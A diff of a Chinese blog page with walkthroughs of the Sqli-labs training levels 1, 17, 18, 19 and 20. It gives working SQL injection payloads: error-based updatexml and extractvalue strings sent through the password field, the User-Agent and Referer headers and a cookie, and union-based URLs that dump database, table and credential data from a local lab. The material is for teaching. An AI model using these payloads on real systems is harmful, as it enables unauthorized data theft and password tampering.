+<p>当<code>uname</code>和<code>passwd</code>传入时，<code>uname</code>会被<code>check_input()</code>这个自定义的函数给处理，这个自定义函数内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果经过addslashes()函数出来，去掉转义</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果不都是数字，就加上两个单引号（因为不是数字就是字符串）</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>对涉及到的函数进行解释一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">addslashes()</span><br><span class="line"></span><br><span class="line">作用：函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">预定义字符是：①单引号（&apos;）② 双引号（&quot;）③ 反斜杠（\）④ NULL</span><br><span class="line"></span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line"></span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stripslashes()</span><br><span class="line"></span><br><span class="line">作用：函数删除由 addslashes() 函数添加的反斜杠</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string()</span><br><span class="line"></span><br><span class="line">作用：函数转义 SQL 语句中使用的字符串中的特殊字符</span><br><span class="line">受影响字符：①\x00 ②\n ③\r ④\ ⑤&apos; ⑥&quot; ⑦\x1a</span><br><span class="line"></span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctype_digit()</span><br><span class="line"></span><br><span class="line">作用：检测字符串中的字符是否都是数字，负数和小数会检测不通过</span><br></pre></td></tr></table></figure>
+<p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。</p>
+<p>在我们less17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入</p>
+<p>那么这题的<code>$sql</code>变量是这样构造的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>也就是说，当你传入的<code>uname</code>在数据库中存在时，才能返回信息</p>
+<p>然后当有返回值时，执行以下语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">mysql_query($update);</span><br></pre></td></tr></table></figure>
+<p>也就是说，当我们输入的<code>uname</code>在数据库里存在是，它就会帮我们修改这个对应的<code>uname</code>的密码，修改为我们输入的<code>passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-1.png" alt="7-1"></p>
+<p>那我们此时就知道不能通过<code>username</code>进行注入，因为会被处理掉，那就通过<code>password</code>来进行</p>
+<p>还是先加<code>单引号</code>看一下报错，发现就是通过<code>单引号</code>包裹的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-2.png" alt="7-2"></p>
+<p>有趣的是，如果我们此时加一个<code>#号</code>，就会把<code>password</code>后面的内容注释掉，那么<code>$update</code>变量就会是这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd';</span></span><br></pre></td></tr></table></figure>
+<p>那么这句语句去执行的后果就是把<code>users</code>表里所有<code>password</code>都改成我们输入的值</p>
+<p>害我再一个一个改回来。。。。</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-3.png" alt="7-3"></p>
+<p>改回来之后开始注入，我们这关利用报错注入，复习一下<code>updatexml()</code>和<code>extractvalue()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">updatexml()</span><br><span class="line">格式：</span><br><span class="line">updatexml(1,concat(0x7e,(),0x7e),1)</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">①updatexml(1,concat(0x7e,(select database()),0x7e),1)</span><br><span class="line">②updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">格式：</span><br><span class="line">extractvalue(1,concat(0x7e,(),0x7e))</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">①extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line">②extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e))</span><br></pre></td></tr></table></figure>
+<p>那我们就使用<code>updatexml()</code>函数来进行报错注入：</p>
+<p>注意：记得加上<code>group_concat()</code>，不然返回多行数据无法一起显示出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-4.png" alt="7-4"></p>
+<p>当以常规想法，继续往下时发现报错了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-5.png" alt="7-5"></p>
+<p>出现了这句话：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
+<p>翻译为：不能先select出同一表中的某些值，再update这个表(在同一语句中)</p>
+<p>那就是前面提到的<code>$update</code>在为我们更新<code>users</code>表的时候，我们又去查询，所以冲突了，那怎么解决的？</p>
+<p>办法：加一层<code>select</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (select username,password from users where id=2)),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-6.png" alt="7-6"></p>
+<p>还是报错，显示：<code>Every derived table must have its own alias</code></p>
+<p>此时就需要在第二层的括号外，加上一个<code>别名（什么都行）</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;&amp;passwd=bb&apos; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (select username,password from users where id=2)hsw),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/7-7.png" alt="7-7"></p>
+<p>此时数据就被我们爆出来了</p>
+<hr>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>从源码可以看出，对<code>uname</code>和<code>passwd</code>都用函数<code>check_input</code>进行了处理，那就不能在这两处地方进行注入</p>
+<p>可是看到了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br></pre></td></tr></table></figure>
+<p>并且这个<code>$uagent</code>变量来自于这里：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-1.png" alt="8-1"></p>
+<p>现在已经知道，通过HTTP请求包的<code>User-Agent</code>字段来进行注入</p>
+<p>代码需要输入正确的用户名和密码才能执行<code>$insert</code>变量</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-2.png" alt="8-2"></p>
+<p>第17关已经让我们修改了用户名密码，这关就可以使用</p>
+<p>此处我们借用<code>Burpsuits</code>来进行注入，提交<code>uname</code>和<code>passwd</code>，并修改<code>User-Agent</code>为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &apos; and extractvalue(1,concat(0x7e,(select database()),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p>注意：在源代码中加上代码，显示<code>$insert</code>变量，来帮助学习</p>
+<p>点击”go”，再返回的内容中，右击  —&gt; “Show response in browser” —&gt; 复制内容  —&gt; 在浏览器中粘贴查看</p>
+<p>此时浏览器代理记得不能断开。做完这些步骤就可以看到内容：</p>
+<p>解释一下<code>$insert</code>变量：我们构造的语句，始终没有逃出<code>INSERT</code>语句后的括号，所以要想办法将单引号包裹掉</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-3.png" alt="8-3"></p>
+<p>爆数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &apos; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p>本关更新的表是<code>uagents</code>表，所以不再需要像前一关那样<code>双层的select＋别名</code>来注入，直接爆出数据</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/8-4.png" alt="8-4"></p>
+<hr>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>查看源代码，与前一关一样，只是将<code>$uagent</code>变量接受的值变成<code>HTTP_REFERER</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/9-1.png" alt="9-1"></p>
+<p>用<code>Burpsuits</code>抓包下来，发现没有<code>Referer</code>字段，那就自己加上去，并且改值：</p>
+<p>注意：这里Referer不要加在最后一行，不然不会被归入头部信息中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">' and extractvalue(1,concat(0x7e,(select concat(username,password) from users where id=2),0x7e)) or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/9-2.png" alt="9-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/9-3.png" alt="9-3"></p>
+<p>原理和前一关一样，不再赘述</p>
+<hr>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>从源代码中可以看出，像之前关卡那样使用<code>uname</code>和<code>passwd</code>进行注入已经不行了，因为在数据库中没有对这两个语句做任何的查询</p>
+<p>继续往下看，看到了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>利用<code>Burpsuits</code>添加<code>Cookie: uname</code>字段，之前的<code>uname</code>和<code>passwd</code>字段随意添加值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=<span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span></span><br></pre></td></tr></table></figure>
+<p>发现返回<code>Your Cookie is deleted</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/10-1.png" alt="10-1"></p>
+<p>仔细看完源代码发现，注意到需要满足if条件，才会执行语句查询</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/10-2.png" alt="10-2"></p>
+<p>那么只需要在<code>Burpsuits</code>中将<code>&amp;submit=Submit</code>删除掉就可以了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/10-3.png" alt="10-3"></p>
+<p>其余的语句自行补充，不再赘述</p>
+<hr>
+<h3 id="至此，11-20关的Write-up结束"><a href="#至此，11-20关的Write-up结束" class="headerlink" title="至此，11-20关的Write-up结束"></a>至此，11-20关的Write-up结束</h3><h3 id="后一部分链接：第21-30关Write-up"><a href="#后一部分链接：第21-30关Write-up" class="headerlink" title="后一部分链接：第21-30关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/31/Sqli-labs%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></h3>
       
 
       
@@ -347,7 +624,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
         		</li>
       		
 		</ul>
@@ -357,7 +634,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/23/PHP语法（十二）—for循环/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/01/30/Sqli-labs 第11-20关/">展开全文 >></a>
         </p>
       
 
@@ -387,43 +664,252 @@
 
 
   
-    <article id="post-PHP语法（十一）—条件结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Sqli-labs 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/22/PHP语法（十一）—条件结构/">PHP语法（十一） — 条件结构</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/">Sqli-labs(第1-10关)</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/22/PHP语法（十一）—条件结构/" class="archive-article-date">
-  	<time datetime="2019-02-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-22</time>
+        <a href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/" class="archive-article-date">
+  	<time datetime="2019-01-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）if语句：条件为真，则执行代码</p>
-<p>（2）if….else语句：如果条件为真，则执行代码；否则，则执行另一端代码</p>
-<p>（3）if…elseif…else：多条件判断，符合则执行</p>
-<p>（4）Switch：多个代码块之一执行，如果没有case为真，则使用default语句</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。</p>
+<p>关于SQL注入的基础知识，可以看我自己整理的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
 <hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、If语句"><a href="#一、If语句" class="headerlink" title="一、If语句"></a>一、If语句</h3><h4 id="1-1-输入代码"><a href="#1-1-输入代码" class="headerlink" title="1.1 输入代码"></a>1.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;</span><br><span class="line">if ($a == 1)&#123;</span><br><span class="line">    echo &quot;a=1&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($a == 2)&#123;</span><br><span class="line">    echo &quot;a=2&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-查看结果"><a href="#1-2-查看结果" class="headerlink" title="1.2 查看结果"></a>1.2 查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%9D%A1%E4%BB%B6%E7%BB%93%E6%9E%84/1-2.png" alt="1-2"></p>
+<h2 id="数据库名、表名、列名"><a href="#数据库名、表名、列名" class="headerlink" title="数据库名、表名、列名"></a>数据库名、表名、列名</h2><p>因为是学习用的，所以先告诉大家这个基于<strong>phpstudy</strong>搭建的<strong>sqli-labs</strong>学习过程中，较频繁使用的重要的数据库名、表名、列名：</p>
+<p>数据库名：security</p>
+<p>security下的表名：emails，referers，uagents，users</p>
+<p>users下的列名：id，username，password</p>
 <hr>
-<h4 id="二、If…else语句"><a href="#二、If…else语句" class="headerlink" title="二、If…else语句"></a>二、If…else语句</h4><h4 id="2-1-输入代码"><a href="#2-1-输入代码" class="headerlink" title="2.1 输入代码"></a>2.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;</span><br><span class="line">if ($a == 1)&#123;</span><br><span class="line">    echo &quot;a=1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/br&gt;----------分割线---------&lt;/br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if ($a == 2)&#123;</span><br><span class="line">    echo &quot;a=2&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;a不等于2&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="2-2-查看结果"><a href="#2-2-查看结果" class="headerlink" title="2.2 查看结果"></a>2.2 查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%9D%A1%E4%BB%B6%E7%BB%93%E6%9E%84/2-2.png" alt="2-2"></p>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less - 1"></a>Less - 1</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。ps：注意后面这个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-1.png" alt="1-1"></p>
+<p>查看 <code>index.php</code> 文件内对于参数<code>ID</code>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<code>单引号</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>既然多了一个<code>单引号</code>会出现报错，那想办法将这个单引号去掉，会不会不报错并且正常显示呢，试一下 <code>&#39; or 1=1 --+</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，sql语句就会变成如下这样，这条语句因or 1=1所以为永恒真</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos; or 1=1 --+&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>回车后就可以看到返回的内容：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-2.png" alt="1-2"></p>
+<p>可以看到我们通过 <strong>–+</strong> 将这个多出来的<strong>单引号</strong>给注释掉了，成功返回内容</p>
+<p>那么我们就可以利用这点，执行其他我们想要执行的语句，比如 <strong>order by</strong>  (关于order by 开头有做简单介绍)</p>
+<p>首先，我们看到 <strong>security-users</strong> 表有3列</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-3.png" alt="1-3"></p>
+<p>如果我们执行 <strong>order by 3</strong> 就会成功，如果超过3就会失败，比如 <strong>order by 4</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-4.png" alt="1-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-5.png" alt="1-5"></p>
+<p>那么此时我们就知道了，可以利用这一点来猜某个表中有多少列</p>
+<p>当id的数据在数据库中不存在时，前台页面返回了我们构造的union 的数据。此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4 --+</span><br></pre></td></tr></table></figure>
+<p><strong>注意</strong>：因为前面我们已经通过 <strong>order by 3</strong> 知道该表有3列，所以这里要 <strong>select 1,2,3</strong> 不然会出错</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-6.png" alt="1-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-7.png" alt="1-7"></p>
+<p>此时我们就可以利用显示的位置，然后通过利用文章开头介绍的<strong>常用函数</strong>，来获取我们需要的信息，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,version(),database() --+</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,@@version_compile_os,@@datadir --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-8.png" alt="1-8"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-9.png" alt="1-9"></p>
+<p>结合前面的关于 <strong>information_schema</strong>  的知识，利用 <strong>union</strong> 命令进行联合注入（层层深入）</p>
+<p>爆所有数据库名（第一层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-10.png" alt="1-10"></p>
+<p>爆security数据库的所有表名（第二层）</p>
